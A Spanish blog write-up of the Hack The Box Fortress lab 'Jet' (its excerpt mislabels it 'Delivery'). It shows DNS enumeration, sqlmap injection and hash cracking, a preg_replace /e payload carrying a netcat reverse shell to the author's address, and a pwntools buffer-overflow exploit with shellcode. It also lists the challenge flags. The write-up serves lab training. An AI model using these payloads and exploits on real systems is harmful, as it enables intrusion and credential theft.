---
layout: single
title: Jet - Hack The Box
excerpt: "Delivery es una máquina de la sección Fortress de Hack The Box."
date: 2022-07-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-jet/jet.PNG
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - DNS
  - SQLi
---

![](/assets/images/htb-writeup-jet/jet.PNG)

Delivery es una máquina de la sección Fortress de Hack The Box en la que se pueden hackear un montón de cosas, así podemos practicar un montón de técnicas distintas en la misma máquina.

## PORT SCAN

```
> nmap -sV -sC -Pn -n -T5 -v 10.13.37.10 --open

22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)
|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)
|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)
53/tcp   open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp   open  http     nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx on Debian!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
5555/tcp open  freeciv?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, adbConnect: 
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|   NULL: 
|     enter your name:
|   SMBProgNeg: 
|     enter your name:
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|     invalid option!
|     [31mMember manager!
|     edit
|     change name
|     gift
|     exit
|_    invalid option!
7777/tcp open  cbt?
| fingerprint-strings: 
|   Arucer, DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, Socks5, X11Probe: 
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|     Delete memo
|     Can't you read mate?
|   NULL: 
|     --==[[ Spiritual Memo ]]==--
|     Create a memo
|     Show memo
|_    Delete memo
```
## OS
```
> ping -c 1 10.13.37.10

PING 10.13.37.10 (10.13.37.10) 56(84) bytes of data.
64 bytes from 10.13.37.10: icmp_seq=1 ttl=63 time=111 ms

--- 10.13.37.10 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.035/111.035/111.035/0.000 ms
```

Para ver que sistema operativo corre en la máquina víctima le mandaremos una `traza ICMP`, aquí podremos ver ttl=63, pero realmente es `ttl=64`, es decir, es una máquina `Linux`. Lo de que se le quita uno al ttl pasa porque la conexión con la máquina no es directa, sino que pasa por un nodo intermediario.


## PUERTO 53: DNS

Antes de empezar con la web, vamos a ver si encontramos algun dominio valido mediante los `DNS`, ya que el `puerto 53` esta abierto.

```
❯ dig @10.13.37.10 -x 10.13.37.10

; <<>> DiG 9.16.27-Debian <<>> @10.13.37.10 -x 10.13.37.10
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 32264
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.	IN	PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.	604800	IN	SOA	www.securewebinc.jet. securewebinc.jet. 3 604800 86400 2419200 604800

;; Query time: 113 msec
;; SERVER: 10.13.37.10#53(10.13.37.10)
;; WHEN: Sat Jul 09 17:27:25 CEST 2022
;; MSG SIZE  rcvd: 109
```
Ahí encontramos el dominio `www.securewebinc.jet`, así que lo agregamos al `/etc/hosts` y lo pondremos en el navegador.

![](/assets/images/htb-writeup-jet/web-53.PNG)

Nos encontramos con esta web, y si bajamos nos encontramos con la `flag`:

![](/assets/images/htb-writeup-jet/web-53-2.PNG)

Pues ya que estamos aquí por si acaso, vamos a mirar el código, pero no sé...

Vale, pues si, sí que había algo interesante, si vamos al final nos encontramos con estos dos enlaces, el primero no es demasiado interesante, pero el segundo sí.

![](/assets/images/htb-writeup-jet/web-53-3.PNG)

Aquí nos encontramos esta cadena que desencriptaremos con la web de `jsnice`:

```
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```

![](/assets/images/htb-writeup-jet/jsnice.PNG)

Pues a primera vista ya vemos un directorio que parece muy interesante: `/dirb_safe_dir_rf9EmcEIx/admin/stats.php` al cual si le quitamos el stats.php nos redirige a una página de `login` el cual obviamente vamos a intentar bypassear.

Pero antes de intentar bypassear el login vamos a ver el código fuente del login y ahí nos encontramos con otra `flag`: `JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}`

Vale, una ves hemos mirado el código ya podemos intentar bypassear el login. Como con `sqlmap` no me ha dejado hacer una `sql incection` en el panel del login, lo que haré sera capturar la petición con `burpsuite`, exportarla a un archivo llamado "login" y luego meter el archivo en sqlmap para que pruebe con ella.

```
> cat login         #este es el archivo donde he copiado la petición

POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
Host: www.securewebinc.jet
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://www.securewebinc.jet
Connection: close
Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
Cookie: PHPSESSID=cff2hfr9uou4u70p2lqar4e8r6
Upgrade-Insecure-Requests: 1

username=uwu&password=uwu



❯ sqlmap -r login –schema

[INFO] fetching tables for databases: ‘information_schema, jetadmin’
```

Nos ha arrojado directamente el `nombre de la BBDD` asi que vamos a `dumpear todo` lo que hay en ella:

```
❯ sqlmap -r login –D jetadmin --dump

Database: jetadmin
Table: users
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |
+----+------------------------------------------------------------------+----------+
```

Nos da ese `hash`, entonces ahora lo tenemos que guardar en un archivo llamado "hash" y lo vamos a romper con `john the reaper`

```
> john --wordlist=rockyou.txt hash

...
Hackthesystem200 (admin)
Session completed
```

Ahora tenemos las credenciales: `username: admin    |    password: Hackthesystem200`

Introduciendo esas credenciales en el panel de login conseguimos entrar y nos encontramos con esto donde en la sección del chat podremos ver otra `flag`:

![](/assets/images/htb-writeup-jet/web-53-4.PNG)

Como no pues vamos a seguir por aqui, que tiene pinta de que todavia se puede explotar mas. Si bajamos e la pagina nos encontramos con un apartado donde `podemos mandar email` y ya que esto consiste en hackear todo lo que podamos pues tiene pinta de que podremos hacer algo con eso.

![](/assets/images/htb-writeup-jet/web-53-5.PNG)

![](/assets/images/htb-writeup-jet/web-53-6.PNG)

Pongamos lo que pongamos nos dará ese error, así que vamos a capturar la petición y ver si podemos cambiar algo.

La data esta `urlencodeada` por lo que si la decodificamos `Crtl + Shift + U` veremos lo siguiente:

![](/assets/images/htb-writeup-jet/web-53-7.PNG)

Vemos que está utilizando expresiones regulares, es decir `/i` por lo que ya vemos una forma de ejecutar comandos, si cambiamos el /i por `/e` podremos ejecutar comandos de forma remota, con lo cual nos podremos mandar una `reverse shell`.

Para eso primero con `netcat` pondremos el puerto 443 a la escucha y luego reemplazaremos la data por (pero donde pone 10.13.14.13 lo reemplazaras por tu ip de HTB): 
```
swearwords[/fuck/e]=system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202>%261|nc%2010.13.14.13%20443%20>/tmp/f')&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad+person&to=uwu@uwu.uwu&subject=uwu&message=uwu&_wysihtml5_mode=1
```

Una vez tenemos la el puerto a la escucha le daremos a `Foward` en `Burpsuite` y deberíamos ver lo siguiente en la consola con netcat:

```
❯ sudo netcat -lvnp 443
Connection received on 10.13.37.10
www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$
```

`PEQUEÑO APUNTE:` utilizamos el puerto 443 ya que es común que los servidores web manden información por ese puerto, por lo que al mandar información por ese puerto ciertas medidas de seguridad no se fijen en eso y no lo detecten.

Ya estamos dentro! Asi que ahora al ver que archivos hay nos encontramos con otra `flag`:

```
> www-data@jet:~/html/dirb_safe_dir_rf9EmcEIx/admin$ ls
a_flag_is_here.txt

> cat a_flag_is_here.txt
JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
```

Pues ya que estamos vamos a intetar `escalar privilegios`, para eso primero miraremos que archivo tienen privilegios `SUID`:

```
www-data@jet:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/lib/uncompress.so
/home/leak
/bin/umount
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/bin/ntfs-3g
/bin/ping6
```

Vemos el arvhivo `/home/leak` que parece interesante.

Si lo ejecutamos nos leakeará un poquito de información y nos dara un campo de input:

```
www-data@jet:~$ /home/leak

Oops, I'm leaking! 0x7ffda13a5490
Pwn me ¯\_(ツ)_/¯ 
>
```

Vamos a `hostear` el directorio `/home` en el puerto 8000:

```
www-data@jet:/home$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Ahora descargaremos el archivo `leak` en nuestra maquina:

```
❯ wget http://10.13.37.10:8000/leak
Grabando a: «leak»
leak                           100%[======================================>]
«leak» guardado [9112/9112]
```

Ahora con gdb intentaremos conseguir el offset para empezar a hacer un exploit que explote la vulnerabilidad `buffer overflow`, es decir, que al meterle un input con más caracteres, esos caracteres extra queden por fuera del buffer y se sobreescriban a la información original y así poder inyectar código malicioso.

```
❯ gdb-peda ./leak

Reading symbols from ./leak...
(No debugging symbols found in ./leak)
(gdb-peda) pattern_create 100 pattern
Writing pattern of 100 chars to filename "pattern"
(gdb-peda) run < pattern
Starting program: ~/leak < pattern
Oops, I'm leaking! 0x7fffffffe600
Pwn me ¯\_(ツ)_/¯ 
> 
Program received signal SIGSEGV, Segmentation fault.
[--------------------------------------------------------------------]
(gdb-peda) x/wx $rsp
0x7fffffffe648: 0x65414149
(gdb-peda) pattern_offset 0x65414149
1698775369 found at offset: 72
(gdb-peda)
```

Vemos que el `ofset es de 72`, asi que podemos iniciar el exploit ejecutando el programa y almacenando lo que nos lekea:

```
shell = process("./leak")
shell.recvuntil(b"Oops, I'm leaking! ")
leaking = int(shell.recvuntil(b"\n"),16)
```

Para el payload usaremos un shellcode de exploitdb para ejecutar "`/bin/sh`", después creando el chunk restandole el total de caracteres del shellcode a el offset, y por ultimo agregando la información que nos lekea al ejecutarlo:

```
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"A"*(72-len(payload))
payload += p64(leaking)
```

Por ultimo nos queda que cuando estemos en el input nos queda enviar el payload, `exportar la TERM`:

```
shell.recvuntil(b"> ")
shell.sendline(payload)
shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
shell.interactive()
```

El `exploit/playload` se veria asi:

```
#!/usr/bin/python3
from pwn import *

shell = remote('10.13.37.10', 9999)
shell.recvuntil(b"Oops, I'm leaking! ")

leaking = int(shell.recvuntil(b"\n"),16)

payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"A"*(72-len(payload))
payload += p64(leaking)

shell.recvuntil(b"> ")
shell.sendline(payload)
shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
shell.interactive()
```

Ahora para exponer el binario, lo haremos con socat por el puerto 9999

```
www-data@jet:~$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &
[1] 7231
```

Para terminar con esto ya simplemente `ejecutamos el exploit` y nos dara la `shell` como el usuario Alex:

```
❯ python3 leak.py
[+] Opening connection to 10.13.37.10 on port 9999: Done
[*] Switching to interactive mode

$ whoami
alex
$ cat flag.txt
JET{0v3rfL0w_f0r_73h_lulz}
```


## WEB: puerto 80 | http

![](/assets/images/htb-writeup-jet/web.PNG)

Pues ahí tenemos otra `flag`

Si lo miramos poniendo la IP en el navegador, o añadiéndole el nombre jet.htb en el archivo `/etc/hosts` y luego poniendo `jet.htb` en el navegador nos va a salir lo mismo.

En `Wappalizer` es raro pero no sale nada, asi que probare con `whatweb`

```
> whatweb http://10.13.37.10

http://10.13.37.10/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[10.13.37.10], Title[Welcome to nginx on Debian!], nginx[1.10.3]
```

Pues empezamos bien, esa versión de nginx es vulnerable, he encontrado un exploit, pero en este caso no nos sirve, todo pinta a que esa página o va a aportarnos nada más, quizás hay alguna otra página o quizás hace `virtual host routing`, porque con `wfuzz` no vemos ningún directorio más (y eso que he probado con varias extensiones distintas: .php .html ...). Por si acaso miraré el código fuente de la página, pero sino pasaremos a otra cosa.

En el código fuente de la página no hay nada interesante por lo que dudo que se pueda hacer más en esa página.



## PUERTO 5555

Aquí también nos encontramos con otra web:

![](/assets/images/htb-writeup-jet/web-5555.PNG)

Y vemos que está cargando y no para, por lo que podemos intuir que hay algún proceso corriendo por detrás que quizás podamos explotar.


## PUERTO 7777

Aquí también nos encontramos con otra web:

![](/assets/images/htb-writeup-jet/web-7777.PNG)



## ROOT

Una vez tenemos una shell (es decir, cuando hemos conseguido la shell explotando el puerto 80 y tirando de ahí) ya simplemente es explotar la vulnerabilidad `pwnkit` y listo.

Flags que quedan:

```
JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}
JET{3sc4p3_s3qu3nc3s_4r3_fun}
JET{h34p_f0r_73h_b4bi3z}
JET{n3xt_t1m3_p1ck_65537}
JET{7h47s_7h3_sp1r17}
```

Ya tendríamos la máquina terminada, pero si parchean lo del pwnkit o me apetece seguir con esto, pues algún día subiré como se explota lo que no he explotado, ya que tenía lo del pwkit.

![](/assets/images/htb-writeup-jet/uwu.PNG)

uwu
